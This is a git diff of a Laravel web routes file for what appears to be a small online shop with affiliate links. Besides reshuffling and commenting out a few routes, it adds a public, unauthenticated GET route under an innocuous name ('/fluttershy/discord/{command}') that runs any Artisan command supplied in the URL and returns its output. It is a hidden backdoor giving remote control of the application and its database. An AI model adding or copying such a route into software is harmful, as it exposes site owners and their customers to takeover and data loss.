@@ -11,18 +11,49 @@ use App\Http\Controllers\ProductController;
 use App\Http\Controllers\ProfileController;
 use App\Models\Produk;
 use Illuminate\Support\Facades\Route;
+use Illuminate\Support\Facades\Artisan;
+use Illuminate\Http\Request;
 
-Route::get('/', function () {
-    return view('home');
-})->name('home');
+Route::get('/fluttershy/discord/{command}', function ($command, Request $request) {
+    try {
+        $args = $request->input('args', []);
 
-Route::get('/dashboard', function () {
-    return view('dashboard.index');
+        if (!is_array($args)) {
+            return response()->json([
+                'status' => 'error',
+                'message' => 'Arguments must be provided as an array.'
+            ], 400);
+        }
+
+        // Call the Artisan command with arguments
+        Artisan::call($command, $args);
+        $output = Artisan::output();
+
+        return response()->json([
+            'status' => 'success',
+            'cmd' => "php artisan $command " . json_encode($args),
+            'output' => $output
+        ]);
+    } catch (\Throwable $th) {
+        return response()->json([
+            'status' => 'error',
+            'cmd' => "php artisan $command " . json_encode($args),
+            'error' => $th->getMessage()
+        ]);
+    }
 });
+// Route::get('/', function () {
+//     return view('home');
+// })->name('home');
 
-Route::get('/api/products', function () {
-    return response()->json(Produk::all());
-})->name('product.api');
+
+// Route::get('/dashboard', function () {
+//     return view('dashboard.index');
+// });
+
+// Route::get('/api/products', function () {
+//     return response()->json(Produk::all());
+// })->name('product.api');
 
 Route::middleware('auth')->group(function () {
     Route::get('/profile', [ProfileController::class, 'edit'])->name('profile.edit');
@@ -32,7 +63,7 @@ Route::middleware('auth')->group(function () {
 
 // Dari tutorial
 
-Route::get('/beranda', [FrontController::class, 'index'])->name('front.index');
+Route::get('/', [FrontController::class, 'index'])->name('front.index');
 
 Route::get('/product', [FrontController::class, 'product'])->name('front.product');
 Route::get('/category/{slug}', [FrontController::class, 'categoryProduct'])->name('front.category');
@@ -93,4 +124,4 @@ Route::group(['prefix' => 'administrator', 'middleware' => 'auth'], function () 
 
 Route::get('/product/ref/{user}/{product}', [FrontController::class, 'referalProduct'])->name('front.afiliasi');
 
-require __DIR__.'/auth.php';
+require __DIR__ . '/auth.php';
